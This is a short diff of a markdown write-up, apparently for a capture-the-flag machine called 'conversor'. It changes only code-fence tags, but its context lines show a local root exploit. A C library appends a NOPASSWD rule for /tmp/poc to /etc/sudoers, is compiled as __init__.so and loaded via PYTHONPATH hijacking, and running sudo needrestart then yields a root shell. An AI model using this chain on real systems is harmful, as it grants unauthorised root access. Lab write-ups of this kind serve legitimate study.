@@ -147,7 +147,7 @@ void a() {
         system("echo 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' >> /etc/sudoers");
     }
 }
-```bash
+```
 ```
 gcc -shared -fPIC -o __init__.so lib.c
 ```bash
@@ -174,7 +174,7 @@ cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py
 another ssh tab and run the binary: 
 ```
 sudo /usr/sbin/needrestart
-```bash
+```
 ```bash
 root@conversor:/tmp/malicious# id
 uid=0(root) gid=0(root) groups=0(root)
